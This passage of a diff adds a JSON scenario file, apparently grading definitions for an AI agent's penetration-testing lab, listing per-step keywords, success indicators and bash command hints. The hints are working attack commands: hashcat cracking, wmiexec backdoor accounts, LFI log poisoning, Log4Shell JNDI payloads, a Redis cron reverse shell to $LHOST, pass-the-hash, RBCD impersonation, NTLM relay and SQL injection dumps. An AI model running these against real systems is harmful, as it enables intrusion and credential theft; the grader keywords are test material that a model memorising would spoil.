+      "depends_on": [
+        "kerberoast"
+      ],
+      "keywords": [
+        "hashcat",
+        "john",
+        "13100",
+        "rockyou",
+        "wordlist",
+        "crack",
+        "nt_hash",
+        "TGS",
+        "-m 13100",
+        "-a 0"
+      ],
+      "output_keywords": [
+        "Cracked",
+        "Status.....: Cracked",
+        "Recovered",
+        "Hashtype",
+        "Session..........: hashcat",
+        "john:",
+        "password ="
+      ],
+      "stealth_event_ids": [],
+      "step": "crack",
+      "success_indicators": [
+        "Cracked",
+        "Recovered",
+        "password",
+        ":"
+      ],
+      "time_budget_s": 300,
+      "tool": "execute_bash",
+      "tool_hint": "hashcat -m 13100 -a 0 /tmp/hashes.kerberoast /usr/share/wordlists/rockyou.txt --force"
+    }
+  ],
+  "lateral_movement": [
+    {
+      "keywords": [
+        "nxc",
+        "netexec",
+        "crackmapexec",
+        "smbclient",
+        "enum4linux",
+        "bloodhound",
+        "sharphound",
+        "ldapsearch",
+        "rpcclient",
+        "smb"
+      ],
+      "output_keywords": [
+        "SMB",
+        "shares",
+        "Domain",
+        "groups",
+        "Users",
+        "Members",
+        "Pwn3d"
+      ],
+      "step": "enumerate",
+      "tool": "execute_bash",
+      "tool_hint": "nxc smb $LAB_NETWORK/24 -u Administrator -p LabAdmin1! --shares 2>&1 | head -40"
+    },
+    {
+      "keywords": [
+        "psexec",
+        "wmiexec",
+        "smbexec",
+        "winrm",
+        "evil-winrm",
+        "atexec",
+        "dcomexec",
+        "impacket",
+        "lateral"
+      ],
+      "output_keywords": [
+        "\\\\",
+        "C:\\",
+        "Administrator",
+        "SYSTEM",
+        "whoami",
+        "portal\\"
+      ],
+      "step": "execute",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-wmiexec portal.lab/Administrator:LabAdmin1!@$LAB_TARGET_SRV 'whoami && hostname' 2>&1 | head -20"
+    },
+    {
+      "keywords": [
+        "schtasks",
+        "net user",
+        "backdoor",
+        "useradd",
+        "adduser",
+        "localgroup",
+        "administrators",
+        "sc create",
+        "wmiexec",
+        "impacket"
+      ],
+      "output_keywords": [
+        "success",
+        "added",
+        "created",
+        "completed",
+        "The command completed"
+      ],
+      "step": "persist",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-wmiexec portal.lab/Administrator:LabAdmin1!@$LAB_TARGET_SRV 'net user backdoor Password1! /add && net localgroup administrators backdoor /add' 2>&1"
+    }
+  ],
+  "lfi_to_rce": [
+    {
+      "keywords": [
+        "curl",
+        "etc/passwd",
+        "page=",
+        "include",
+        "file=",
+        "path=",
+        "../../../../",
+        "wrapper",
+        "php://filter",
+        "ffuf",
+        "burp",
+        "php://filter",
+        "base64-encode",
+        "resource="
+      ],
+      "output_keywords": [
+        "root:x:",
+        "etc/passwd",
+        "nobody:",
+        "daemon:",
+        "www-data:",
+        "base64",
+        "passwd"
+      ],
+      "step": "lfi_confirm",
+      "tool": "execute_bash",
+      "tool_hint": "curl 'http://$LAB_TARGET_WEB:8080/lfi.php?file=../../../etc/passwd' && curl 'http://$LAB_TARGET_WEB:8080/lfi.php?file=php://filter/convert.base64-encode/resource=/etc/passwd'"
+    },
+    {
+      "keywords": [
+        "User-Agent",
+        "<?php",
+        "access.log",
+        "/proc/self",
+        "auth.log",
+        "mail.log",
+        "session",
+        "/var/log",
+        "poison",
+        "inject",
+        "curl -A",
+        "system(",
+        "apache2/access.log"
+      ],
+      "output_keywords": [
+        "<?php",
+        "access.log",
+        "User-Agent",
+        "uid=",
+        "200",
+        "GET /"
+      ],
+      "step": "log_poison",
+      "tool": "execute_bash",
+      "tool_hint": "curl -A '<?php system($_GET[\"cmd\"]); ?>' http://$LAB_TARGET_WEB:8080/lfi.php && curl 'http://$LAB_TARGET_WEB:8080/lfi.php?file=../../../var/log/apache2/access.log&cmd=id'"
+    },
+    {
+      "keywords": [
+        "cmd=",
+        "whoami",
+        "execute",
+        "shell_exec",
+        "passthru",
+        "popen",
+        "&cmd=",
+        "?cmd=",
+        "c=",
+        "exec=",
+        "curl '",
+        "&cmd=id",
+        "access.log&cmd"
+      ],
+      "output_keywords": [
+        "www-data",
+        "root",
+        "uid=",
+        "whoami",
+        "id"
+      ],
+      "step": "rce",
+      "tool": "execute_bash",
+      "tool_hint": "curl 'http://$LAB_TARGET_WEB:8080/lfi.php?file=../../../var/log/apache2/access.log&cmd=whoami'"
+    },
+    {
+      "keywords": [
+        "suid",
+        "sudo",
+        "root",
+        "www-data",
+        "linpeas",
+        "find / -perm",
+        "chmod",
+        "shell",
+        "sudo -l",
+        "-4000"
+      ],
+      "output_keywords": [
+        "-rwsr-",
+        "NOPASSWD",
+        "SUID",
+        "uid=0",
+        "root"
+      ],
+      "step": "privesc",
+      "tool": "execute_bash",
+      "tool_hint": "find / -perm -4000 -type f 2>/dev/null && sudo -l"
+    }
+  ],
+  "linux_privesc": [
+    {
+      "keywords": [
+        "find / -perm",
+        "suid",
+        "gtfobins",
+        "linpeas",
+        "linenum",
+        "pspy",
+        "find_suid",
+        "find /",
+        "-4000",
+        "lse.sh",
+        "les.sh",
+        "linux-exploit-suggester"
+      ],
+      "output_keywords": [
+        "/usr/bin/",
+        "/bin/",
+        "/usr/sbin/",
+        "4755",
+        "-rwsr-",
+        "suid",
+        "SUID",
+        "linpeas"
+      ],
+      "step": "suid_enum",
+      "tool": "execute_bash",
+      "tool_hint": "find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid.txt && cat /tmp/suid.txt"
+    },
+    {
+      "keywords": [
+        "sudo -l",
+        "sudoers",
+        "NOPASSWD",
+        "sudo_check",
+        "check_sudo",
+        "sudo -i",
+        "(ALL)",
+        "env_keep"
+      ],
+      "output_keywords": [
+        "NOPASSWD",
+        "(ALL)",
+        "sudo",
+        "sudoers",
+        "env_keep",
+        "/bin/bash"
+      ],
+      "step": "sudo_check",
+      "tool": "execute_bash",
+      "tool_hint": "sudo -l 2>/dev/null && cat /etc/sudoers 2>/dev/null"
+    },
+    {
+      "keywords": [
+        "/bin/bash -p",
+        "/bin/bash",
+        "python3 -c",
+        "chmod u+s",
+        "execute_shell",
+        "privesc",
+        "exploit",
+        "bash -p",
+        "pty.spawn",
+        "import pty",
+        "awk 'BEGIN",
+        "vim -c",
+        "perl -e",
+        "less -e",
+        "nano -e",
+        "env /bin/sh",
+        "sudo su",
+        "sudo bash",
+        "bash -i",
+        "su -",
+        "su root",
+        "SUID",
+        "gtfobins"
+      ],
+      "output_keywords": [
+        "root@",
+        "uid=0",
+        "euid=0",
+        "#",
+        "bash-",
+        "root:/root"
+      ],
+      "step": "exploit",
+      "tool": "execute_bash",
+      "tool_hint": "/bin/bash -p && whoami  # OR: sudo bash  # OR: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "id",
+        "root.txt",
+        "/flag",
+        "uid=0",
+        "root@",
+        "#",
+        "euid=0"
+      ],
+      "output_keywords": [
+        "root",
+        "uid=0",
+        "euid=0",
+        "root.txt",
+        "flag{",
+        "HTB{"
+      ],
+      "step": "confirm",
+      "tool": "execute_bash",
+      "tool_hint": "whoami && id && cat /root/root.txt 2>/dev/null"
+    }
+  ],
+  "log4shell_rce": [
+    {
+      "keywords": [
+        "jndi",
+        "ldap",
+        "log4j",
+        "log4shell",
+        "CVE-2021-44228",
+        "${jndi:",
+        "X-Api-Version",
+        "User-Agent",
+        "curl -H"
+      ],
+      "output_keywords": [
+        "200",
+        "jndi",
+        "ldap",
+        "callback",
+        "connection",
+        "log4j",
+        "CVE-2021"
+      ],
+      "step": "detect",
+      "tool": "execute_bash",
+      "tool_hint": "curl -H 'X-Api-Version: ${jndi:ldap://$LHOST:1389/a}' http://$LAB_TARGET_WEB:8983/solr/admin/cores  # if LDAP connection received, vulnerable"
+    },
+    {
+      "keywords": [
+        "marshalsec",
+        "LDAPRefServer",
+        "jndi",
+        "ldap server",
+        "exploit server",
+        "http.server",
+        "marshalsec.jndi"
+      ],
+      "output_keywords": [
+        "Listening",
+        "LDAPRefServer",
+        "marshalsec",
+        "http.server",
+        "Serving",
+        "1389"
+      ],
+      "step": "server",
+      "tool": "execute_bash",
+      "tool_hint": "python3 -m http.server 8888 & java -cp /opt/marshalsec/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer 'http://$LHOST:8888/#Exploit'"
+    },
+    {
+      "keywords": [
+        "Exploit.java",
+        "javac",
+        "jndi:ldap",
+        "${jndi",
+        "ldap://",
+        "1389",
+        "javac Exploit"
+      ],
+      "output_keywords": [
+        "Note:",
+        "javac",
+        "${jndi",
+        "Exploit.class",
+        "200",
+        "ldap://"
+      ],
+      "step": "payload",
+      "tool": "execute_bash",
+      "tool_hint": "javac Exploit.java && curl -H 'X-Api-Version: ${jndi:ldap://$LHOST:1389/Exploit}' http://$LAB_TARGET_WEB:8983/solr/admin/cores"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "id",
+        "uid=",
+        "reverse shell",
+        "nc -lvnp",
+        "callback",
+        "shell",
+        "root"
+      ],
+      "output_keywords": [
+        "listening",
+        "connect",
+        "whoami",
+        "uid=",
+        "id",
+        "shell"
+      ],
+      "step": "rce_confirm",
+      "tool": "execute_bash",
+      "tool_hint": "nc -lvnp 4444  # catch reverse shell; confirm: whoami && id"
+    }
+  ],
+  "meta3_full_compromise": [
+    {
+      "keywords": [
+        "nmap",
+        "nxc",
+        "-sV",
+        "curl",
+        "open",
+        "21",
+        "445",
+        "3306",
+        "4848",
+        "8080",
+        "9200",
+        "service",
+        "version",
+        "nmap"
+      ],
+      "output_keywords": [
+        "open",
+        "ftp",
+        "smb",
+        "mysql",
+        "glassfish",
+        "tomcat",
+        "elasticsearch",
+        "iis",
+        "445"
+      ],
+      "step": "enum_all",
+      "success_indicators": [
+        "open",
+        "445",
+        "3306"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "nmap -Pn -sV -p 21,445,3306,4848,8080,9200 $LAB_TARGET_META3_WIN 2>&1 | head -40"
+    },
+    {
+      "keywords": [
+        "nxc winrm",
+        "LAB_META3_USER",
+        "LAB_META3_PASS",
+        "whoami"
+      ],
+      "output_keywords": [
+        "Pwn3d",
+        "whoami",
+        "vagrant",
+        "Administrator"
+      ],
+      "step": "remote_execution",
+      "success_indicators": [
+        "Pwn3d",
+        "vagrant",
+        "Administrator"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "nxc winrm $LAB_TARGET_META3_WIN -u \"$LAB_META3_USER\" -p \"$LAB_META3_PASS\" -X 'whoami' 2>&1 | head -20"
+    },
+    {
+      "keywords": [
+        "mysql",
+        "VERSION",
+        "CURRENT_USER",
+        "SHOW DATABASES",
+        "LAB_META3_USER"
+      ],
+      "output_keywords": [
+        "VERSION()",
+        "CURRENT_USER()",
+        "Database",
+        "information_schema"
+      ],
+      "step": "mysql_access",
+      "success_indicators": [
+        "VERSION()",
+        "Database"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "mysql --connect-timeout=5 -h $LAB_TARGET_META3_WIN -u \"$LAB_META3_USER\" -p\"$LAB_META3_PASS\" -e 'SELECT VERSION(), CURRENT_USER(); SHOW DATABASES;' 2>&1 | head -30"
+    },
+    {
+      "keywords": [
+        "glassfish",
+        "4848",
+        "elasticsearch",
+        "9200",
+        "tomcat",
+        "8080",
+        "admin"
+      ],
+      "output_keywords": [
+        "GlassFish",
+        "elasticsearch",
+        "admin",
+        "200",
+        "management"
+      ],
+      "step": "pivot",
+      "success_indicators": [
+        "GlassFish",
+        "elasticsearch",
+        "200"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "curl -u admin:admin http://$LAB_TARGET_META3_WIN:4848/management/domain 2>&1 | head -5 && curl -s http://$LAB_TARGET_META3_WIN:9200/ 2>&1 | head -5"
+    }
+  ],
+  "mysql_udf_privesc": [
+    {
+      "keywords": [
+        "mysql",
+        "root",
+        "password",
+        "login",
+        "mysql -h",
+        "credentials",
+        "LAB_META3_USER"
+      ],
+      "output_keywords": [
+        "VERSION()",
+        "CURRENT_USER()",
+        "mysql",
+        "vagrant"
+      ],
+      "step": "creds",
+      "success_indicators": [
+        "VERSION()",
+        "CURRENT_USER()"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "mysql --connect-timeout=5 -h $LAB_TARGET_META3_WIN -u \"$LAB_META3_USER\" -p\"$LAB_META3_PASS\" -e 'SELECT VERSION(), CURRENT_USER();' 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "SHOW DATABASES",
+        "mysql",
+        "inventory",
+        "LAB_META3_PASS"
+      ],
+      "output_keywords": [
+        "Database",
+        "information_schema",
+        "mysql"
+      ],
+      "step": "database_inventory",
+      "success_indicators": [
+        "Database",
+        "information_schema"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "mysql --connect-timeout=5 -h $LAB_TARGET_META3_WIN -u \"$LAB_META3_USER\" -p\"$LAB_META3_PASS\" -e 'SHOW DATABASES;' 2>&1 | head -30"
+    },
+    {
+      "keywords": [
+        "SELECT",
+        "mysql.user",
+        "User",
+        "Host",
+        "LIMIT"
+      ],
+      "output_keywords": [
+        "User",
+        "Host",
+        "root",
+        "vagrant"
+      ],
+      "step": "bounded_data_access",
+      "success_indicators": [
+        "User",
+        "Host"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "mysql --connect-timeout=5 -h $LAB_TARGET_META3_WIN -u \"$LAB_META3_USER\" -p\"$LAB_META3_PASS\" -e 'SELECT User,Host FROM mysql.user LIMIT 20;' 2>&1 | head -30"
+    }
+  ],
+  "nfs_privesc_chain": [
+    {
+      "keywords": [
+        "showmount",
+        "mount",
+        "no_root_squash",
+        "exportfs",
+        "showmount -e",
+        "/etc/exports"
+      ],
+      "output_keywords": [
+        "Export list",
+        "no_root_squash",
+        "/etc/exports",
+        "everyone",
+        "/share",
+        "/home",
+        "nfs"
+      ],
+      "step": "enum_nfs",
+      "tool": "execute_bash",
+      "tool_hint": "showmount -e $LAB_TARGET_WEB && nmap -p 2049 --script nfs-showmount $LAB_TARGET_WEB"
+    },
+    {
+      "keywords": [
+        "mount -t nfs",
+        "/mnt",
+        "nfs",
+        "mount -t",
+        "nolock"
+      ],
+      "output_keywords": [
+        "mounted",
+        "/tmp/nfs",
+        "/mnt/nfs",
+        "nfs on",
+        "type nfs"
+      ],
+      "step": "mount",
+      "tool": "execute_bash",
+      "tool_hint": "mkdir /tmp/nfs && mount -t nfs $LAB_TARGET_WEB:/srv/nfs/share /tmp/nfs -o nolock"
+    },
+    {
+      "keywords": [
+        "cp /bin/bash",
+        "chmod u+s",
+        "suid",
+        "bash -p",
+        "chmod +s"
+      ],
+      "output_keywords": [
+        "-rwsr-",
+        "4755",
+        "root@",
+        "uid=0",
+        "euid=0"
+      ],
+      "step": "suid",
+      "tool": "execute_bash",
+      "tool_hint": "cp /bin/bash /tmp/nfs/bash && chmod u+s /tmp/nfs/bash && ls -la /tmp/nfs/bash && /tmp/nfs/bash -p 2>/dev/null || echo 'SUID placed \u2014 run /tmp/nfs/bash -p from a shell on the target'"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "root",
+        "flag",
+        "uid=0",
+        "root.txt",
+        "/tmp/nfs/bash",
+        "bash -p",
+        "id"
+      ],
+      "output_keywords": [
+        "root",
+        "uid=0",
+        "euid=0",
+        "flag{",
+        "root.txt",
+        "-rwsr",
+        "4755"
+      ],
+      "step": "confirm",
+      "tool": "execute_bash",
+      "tool_hint": "/tmp/nfs/bash -p 2>/dev/null && whoami && id && cat /root/root.txt"
+    }
+  ],
+  "pass_the_hash": [
+    {
+      "keywords": [
+        "secretsdump",
+        "ntlm",
+        "hash",
+        "lsass",
+        "mimikatz",
+        "hashdump",
+        "sam",
+        "ntds",
+        "secretsdump.py"
+      ],
+      "output_keywords": [
+        "NTLM",
+        "::::",
+        "Administrator:",
+        "aad3b435",
+        "LM:",
+        "Hash",
+        "SAM"
+      ],
+      "stealth_event_ids": [
+        4662
+      ],
+      "step": "dump_hash",
+      "success_indicators": [
+        "NTLM",
+        "aad3b435",
+        "Administrator:",
+        "::::"
+      ],
+      "time_budget_s": 60,
+      "tool": "execute_bash",
+      "tool_hint": "impacket-secretsdump portal.lab/Administrator:LabAdmin1!@$LAB_TARGET_DC -just-dc-user Administrator"
+    },
+    {
+      "keywords": [
+        "crackmapexec",
+        "pass-the-hash",
+        "-H ",
+        "pth",
+        "ntlm",
+        "hash",
+        "crackmapexec smb",
+        "--pass-the-hash",
+        "-H $",
+        "nxc smb",
+        "-H "
+      ],
+      "output_keywords": [
+        "Pwn3d!",
+        "(Pwn3d!)",
+        "STATUS_SUCCESS",
+        "[+]",
+        "success",
+        "Admin"
+      ],
+      "stealth_event_ids": [
+        4625,
+        4771
+      ],
+      "step": "pth_spray",
+      "success_indicators": [
+        "Pwn3d!",
+        "STATUS_SUCCESS",
+        "(Pwn3d!)",
+        "[+]"
+      ],
+      "time_budget_s": 60,
+      "tool": "execute_bash",
+      "tool_hint": "nxc smb $LAB_TARGET_DC -u Administrator -H $NTLM_HASH --continue-on-success"
+    },
+    {
+      "keywords": [
+        "evil-winrm",
+        "psexec",
+        "wmiexec",
+        "smbexec",
+        "-H ",
+        "impacket",
+        "winrm",
+        "evil-winrm -i",
+        "evil-winrm -H"
+      ],
+      "output_keywords": [
+        "Evil-WinRM",
+        "PS C:\\",
+        "C:\\Users",
+        "Windows PowerShell",
+        "Administrator",
+        "session"
+      ],
+      "stealth_event_ids": [
+        4624
+      ],
+      "step": "lateral",
+      "success_indicators": [
+        "Evil-WinRM",
+        "PS C:\\",
+        "C:\\Users"
+      ],
+      "time_budget_s": 60,
+      "tool": "execute_bash",
+      "tool_hint": "evil-winrm -i $LAB_TARGET_DC -u Administrator -H $NTLM_HASH"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "hostname",
+        "root.txt",
+        "Administrator",
+        "SYSTEM",
+        "type ",
+        "flag"
+      ],
+      "output_keywords": [
+        "Administrator",
+        "SYSTEM",
+        "C:\\Users",
+        "root.txt",
+        "flag{",
+        "whoami"
+      ],
+      "stealth_event_ids": [],
+      "step": "confirm",
+      "time_budget_s": 30,
+      "tool": "execute_bash",
+      "tool_hint": "whoami && hostname && cat C:\\Users\\Administrator\\Desktop\\root.txt"
+    }
+  ],
+  "rbcd_attack": [
+    {
+      "keywords": [
+        "findDelegation",
+        "delegation",
+        "msDS-AllowedToActOnBehalfOfOtherIdentity",
+        "BloodHound",
+        "msDS-Allowed",
+        "GenericWrite",
+        "constrained"
+      ],
+      "output_keywords": [
+        "delegation",
+        "constrained",
+        "unconstrained",
+        "AllowedToActOn",
+        "msDS",
+        "AccountName"
+      ],
+      "step": "enum_delegation",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-findDelegation portal.lab/Administrator:LabAdmin1! -dc-ip $LAB_TARGET_DC"
+    },
+    {
+      "keywords": [
+        "addcomputer.py",
+        "computer-name",
+        "computer-pass",
+        "LDAPS",
+        "machine account",
+        "addcomputer",
+        "impacket-addcomputer"
+      ],
+      "output_keywords": [
+        "Added computer",
+        "computer account",
+        "FAKE01",
+        "successfully",
+        "computer"
+      ],
+      "step": "add_computer",
+      "tool": "execute_bash",
+      "tool_hint": "impacket-addcomputer portal.lab/Administrator:LabAdmin1! -method LDAPS -computer-name FAKE01 -computer-pass 'Passw0rd!' -dc-ip $LAB_TARGET_DC"
+    },
+    {
+      "keywords": [
+        "rbcd.py",
+        "msDS-AllowedToActOnBehalfOfOtherIdentity",
+        "resource-based",
+        "constrained delegation",
+        "rbcd",
+        "-action write",
+        "FAKE01",
+        "-f FAKE01",
+        "impacket-rbcd"
+      ],
+      "output_keywords": [
+        "Attribute msDS-AllowedToActOnBehalf",
+        "msDS-AllowedToAct",
+        "delegation set",
+        "write",
+        "successfully"
+      ],
+      "step": "set_rbcd",
+      "tool": "",
+      "tool_hint": "impacket-rbcd -f FAKE01 -t $TARGET_COMPUTER -dc-ip $LAB_TARGET_DC -action write portal.lab/Administrator:LabAdmin1!"
+    },
+    {
+      "keywords": [
+        "getST.py",
+        "impersonate",
+        "cifs/",
+        "S4U2Proxy",
+        "S4U2Self",
+        "getST",
+        "-impersonate",
+        "KRB5CCNAME",
+        "ticket",
+        "TGS",
+        "ccache",
+        "export KRB5",
+        "Passw0rd",
+        "psexec.py -k",
+        "rubeus s4u",
+        "s4u2self",
+        "delegate",
+        "getST",
+        "getst.py",
+        "smbclient -k",
+        "impacket-getST"
+      ],
+      "output_keywords": [
+        "Saving ticket",
+        ".ccache",
+        "ticket saved",
+        "S4U2",
+        "Impersonating",
+        "NT AUTHORITY\\SYSTEM",
+        "C:\\"
+      ],
+      "step": "impersonate",
+      "tool": "",
+      "tool_hint": "impacket-getST -spn 'cifs/$TARGET_COMPUTER.portal.lab' -impersonate Administrator -dc-ip $LAB_TARGET_DC portal.lab/FAKE01:Passw0rd!  && export KRB5CCNAME=Administrator@cifs_TARGET.ccache && impacket-psexec -k -no-pass portal.lab/Administrator@$LAB_TARGET_DC"
+    }
+  ],
+  "redis_to_rce": [
+    {
+      "keywords": [
+        "redis-cli",
+        "6379",
+        "ping",
+        "PONG",
+        "redis",
+        "nc 10",
+        "nmap",
+        "nc -z",
+        "redis ping",
+        "info server",
+        "redis-cli -h",
+        "port 6379",
+        ":6379"
+      ],
+      "output_keywords": [
+        "PONG",
+        "redis_version",
+        "redis_mode",
+        "connected_clients",
+        "6379",
+        "redis"
+      ],
+      "step": "connect",
+      "tool": "execute_bash",
+      "tool_hint": "redis-cli -h $LAB_TARGET_WEB ping && redis-cli -h $LAB_TARGET_WEB info server"
+    },
+    {
+      "keywords": [
+        "config set dir",
+        "authorized_keys",
+        "bgsave",
+        "ssh-rsa",
+        "ssh-keygen",
+        "dbfilename",
+        "config set dbfilename",
+        "ssh_key",
+        "known_hosts",
+        "/root/.ssh",
+        "config set",
+        "authorized",
+        "/var/lib/redis",
+        "flushall",
+        "-x set",
+        "redis_key"
+      ],
+      "output_keywords": [
+        "OK",
+        "Background saving",
+        "bgsave",
+        "ssh-rsa",
+        "authorized_keys",
+        "config set"
+      ],
+      "step": "ssh_key",
+      "tool": "execute_bash",
+      "tool_hint": "ssh-keygen -t rsa -f /tmp/redis_key -N '' && (echo -e '\\n\\n'; cat /tmp/redis_key.pub; echo -e '\\n\\n') > /tmp/blob.txt && redis-cli -h $LAB_TARGET_WEB flushall && cat /tmp/blob.txt | redis-cli -h $LAB_TARGET_WEB -x set sshblob && redis-cli -h $LAB_TARGET_WEB config set dir /var/lib/redis/.ssh && redis-cli -h $LAB_TARGET_WEB config set dbfilename authorized_keys && redis-cli -h $LAB_TARGET_WEB bgsave"
+    },
+    {
+      "keywords": [
+        "crontabs",
+        "cron",
+        "bash -i",
+        "reverse shell",
+        "/var/spool",
+        "crontab",
+        "bash -c",
+        "/tmp/",
+        "nc -e",
+        "mkfifo",
+        "config set dir /var/spool",
+        "SET x",
+        "bgsave",
+        "/dev/tcp",
+        "redis-cli -h"
+      ],
+      "output_keywords": [
+        "OK",
+        "Background saving",
+        "bgsave",
+        "crontabs",
+        "/var/spool",
+        "config set"
+      ],
+      "step": "cron_write",
+      "tool": "execute_bash",
+      "tool_hint": "redis-cli -h $LAB_TARGET_WEB config set dir /var/spool/cron/crontabs && redis-cli -h $LAB_TARGET_WEB config set dbfilename root && redis-cli -h $LAB_TARGET_WEB SET x $'\\n\\n* * * * * bash -i >& /dev/tcp/$LHOST/4444 0>&1\\n\\n' && redis-cli -h $LAB_TARGET_WEB bgsave"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "id",
+        "root",
+        "rce",
+        "uid=0",
+        "hostname",
+        "uname",
+        "cat /etc/passwd",
+        "nc -lvnp",
+        "lvnp",
+        "listen",
+        "callback",
+        "shell",
+        "ssh -i",
+        "redis@",
+        "redis_key"
+      ],
+      "output_keywords": [
+        "redis@",
+        "whoami",
+        "uid=",
+        "uid=0",
+        "shell",
+        "id\n",
+        "root@"
+      ],
+      "step": "confirm_rce",
+      "tool": "execute_bash",
+      "tool_hint": "ssh -i /tmp/redis_key redis@$LAB_TARGET_WEB && whoami && id"
+    }
+  ],
+  "smb_enum_relay": [
+    {
+      "keywords": [
+        "--gen-relay-list",
+        "signing",
+        "crackmapexec",
+        "nxc smb",
+        "check_signing",
+        "smb-signing",
+        "smbsigning",
+        "smb2",
+        "security-mode",
+        "message_signing",
+        "nmap --script smb",
+        "gen-relay-list",
+        "relay-list",
+        "smb-security-mode",
+        "smb2-security-mode"
+      ],
+      "output_keywords": [
+        "signing",
+        "message signing",
+        "not required",
+        "enabled",
+        "disabled",
+        "targets.txt",
+        "SMB"
+      ],
+      "step": "signing_check",
+      "tool": "execute_bash",
+      "tool_hint": "nxc smb $LAB_NETWORK/24 -u '' -p '' 2>&1 | grep -i sign; nxc smb $LAB_NETWORK/24 -u '' -p '' --gen-relay-list /tmp/targets.txt 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "smbclient -N",
+        "enum4linux",
+        "enum4linux-ng",
+        "rpcclient",
+        "null session",
+        "-N ",
+        "anonymous",
+        "nxc smb",
+        "crackmapexec smb",
+        "smbmap",
+        "net use"
+      ],
+      "output_keywords": [
+        "Anonymous",
+        "null session",
+        "guest",
+        "Sharename",
+        "enum4linux",
+        "WORKGROUP",
+        "domain name"
+      ],
+      "step": "null_session",
+      "tool": "execute_bash",
+      "tool_hint": "nxc smb $LAB_TARGET_DC -u '' -p '' && enum4linux-ng -A $LAB_TARGET_DC"
+    },
+    {
+      "condition": {
+        "equals": true,
+        "field": "smb_signing_disabled"
+      },
+      "keywords": [
+        "ntlmrelayx",
+        "relay",
+        "smbexec",
+        "shell",
+        "ntlmrelay",
+        "-smb2support",
+        "MultiRelay",
+        "impacket-ntlmrelayx",
+        "-tf ",
+        "targets.txt",
+        "ntlmrelayx.py",
+        "-smb2",
+        "impacket",
+        "-socks",
+        "proxychains"
+      ],
+      "output_keywords": [
+        "relay",
+        "ntlmrelayx",
+        "NTLM",
+        "socks",
+        "session",
+        "authenticated"
+      ],
+      "step": "relay",
+      "success_indicators": [
+        "socks",
+        "session",
+        "authenticated",
+        "relay",
+        "SMB"
+      ],
+      "tool": "",
+      "tool_hint": "impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support -socks && proxychains smbclient //$LAB_TARGET_DC/C$"
+    },
+    {
+      "keywords": [
+        "Responder",
+        "LLMNR",
+        "NBT-NS",
+        "responder -I",
+        "responder.py",
+        "inveigh",
+        "mitm6",
+        "DHCPv6",
+        "IPv6",
+        "Responder.py",
+        "-I eth0",
+        "-dwv",
+        "responder -wv",
+        "Responder.conf",
+        "-wPF",
+        "tun0"
+      ],
+      "output_keywords": [
+        "Responder",
+        "LLMNR",
+        "NBT-NS",
+        "Listening",
+        "poisoner",
+        "NTLMv2",
+        "hash"
+      ],
+      "step": "responder",
+      "success_indicators": [
+        "Listening",
+        "poisoner",
+        "NTLMv2",
+        "LLMNR"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "sed -i 's/^SMB = On/SMB = Off/' /etc/responder/Responder.conf && sed -i 's/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf && responder -I eth0 -wPF"
+    }
+  ],
+  "sqli_manual": [
+    {
+      "keywords": [
+        "'",
+        "--",
+        "1=1",
+        "error",
+        "syntax",
+        "sqlmap",
+        "sleep(",
+        "SLEEP",
+        "blind",
+        "time-based",
+        "boolean",
+        "' OR '1'='1",
+        "login.php",
+        "curl.*login"
+      ],
+      "output_keywords": [
+        "error",
+        "syntax",
+        "SQL",
+        "Warning",
+        "mysql",
+        "1=1",
+        "login"
+      ],
+      "step": "detect",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB:8080/login.php' -d \"username=admin'&password=test\" 2>&1 | head -20"
+    },
+    {
+      "keywords": [
+        "UNION SELECT",
+        "ORDER BY",
+        "NULL",
+        "column count",
+        "UNION ALL",
+        "group_concat",
+        "concat(",
+        "information_schema",
+        "ORDER BY 1",
+        "ORDER BY 2",
+        "ORDER BY 3"
+      ],
+      "output_keywords": [
+        "UNION",
+        "ORDER",
+        "column",
+        "NULL",
+        "2",
+        "3"
+      ],
+      "step": "union",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB:8080/login.php' -d \"username=admin' ORDER BY 3--+&password=x\" 2>&1 | head -10 && curl -s 'http://$LAB_TARGET_WEB:8080/login.php' -d \"username=admin' UNION SELECT 1,2,3--+&password=x\" 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "version()",
+        "database()",
+        "schema",
+        "table_name",
+        "@@version",
+        "user()",
+        "current_user",
+        "tables",
+        "columns",
+        "information_schema.tables",
+        "group_concat"
+      ],
+      "output_keywords": [
+        "version",
+        "database",
+        "schema",
+        "information_schema",
+        "@@version"
+      ],
+      "step": "extract",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB:8080/login.php' -d \"username=admin' UNION SELECT version(),database(),3--+&password=x\" 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "users",
+        "password",
+        "hash",
+        "credentials",
+        "LOAD_FILE",
+        "INTO OUTFILE",
+        "dump",
+        "admin",
+        "passwords",
+        "FROM users",
+        "username"
+      ],
+      "output_keywords": [
+        "admin",
+        "password",
+        "hash",
+        "username",
+        "$2y$",
+        "credentials"
+      ],
+      "step": "dump",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB:8080/login.php' -d \"username=admin' UNION SELECT username,password,3 FROM users--+&password=x\" 2>&1 | head -10"
+    }
+  ],
+  "ssrf_exploitation": [
+    {
+      "keywords": [
+        "curl",
+        "ssrf",
+        "localhost",
+        "127.0.0.1",
